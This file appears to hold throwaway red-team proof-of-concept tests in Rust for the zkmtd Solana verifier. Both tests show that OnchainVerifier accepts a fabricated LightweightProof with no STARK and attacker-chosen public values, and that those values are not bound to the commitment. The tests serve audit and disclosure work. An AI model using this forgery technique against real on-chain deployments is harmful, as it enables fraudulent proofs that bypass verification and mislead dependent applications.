//! THROWAWAY red-team PoC tests. Delete after audit.
#![allow(unused)]

use zkmtd::solana::{LightweightProof, OnchainVerifier};
use zkmtd::solana::onchain_verifier::VerificationStatus;

// ---------------------------------------------------------------------------
// ATTACK 1: On-chain verifier accepts a fully fabricated "proof" with no STARK.
// The LightweightProof carries arbitrary public_values + commitment; the
// OnchainVerifier::verify() never checks a STARK. If the attacker controls the
// committed_values field (which they set themselves), verify() returns Valid.
// ---------------------------------------------------------------------------
#[test]
fn attack1_onchain_accepts_fabricated_proof() {
    // Attacker fabricates a proof out of thin air. No prover involved.
    let attacker_committed = [0xAAu8; 32];
    let fake = LightweightProof::from_commitment(
        [0xBBu8; 32],                       // arbitrary commitment
        100,                                // current epoch
        vec![999_999, 0, 0, 0, 0, 0, 0, 0], // arbitrary "public values"
        attacker_committed,
    );

    // The on-chain verifier is constructed with the attacker-chosen committed
    // values (this is the realistic case where the dApp trusts whatever the
    // submitter registered, OR uses the proof's own committed value).
    let verifier = OnchainVerifier::new(100, attacker_committed);
    let status = verifier.verify(&fake);
    println!("ATTACK1 status = {:?}", status);
    assert_eq!(
        status,
        VerificationStatus::Valid,
        "on-chain verifier accepted a proof with NO stark and attacker-chosen values"
    );
}

// ---------------------------------------------------------------------------
// ATTACK 2: Does the on-chain verifier ever bind public_values to
// committed_values? Submit public_values that do NOT correspond to the
// committed hash. Verifier has no expected_public_values configured.
// ---------------------------------------------------------------------------
#[test]
fn attack2_onchain_pv_not_bound_to_commitment() {
    let committed = [0x11u8; 32];
    // public_values are garbage and unrelated to committed hash.
    let p = LightweightProof::from_commitment([0x22u8; 32], 50, vec![1, 2, 3], committed);
    let verifier = OnchainVerifier::new(50, committed); // no with_expected_values
    let status = verifier.verify(&p);
    println!("ATTACK2 status = {:?}", status);
    // If Valid, the on-chain layer does NOT cryptographically tie pv to commitment.
    assert_eq!(status, VerificationStatus::Valid);
}
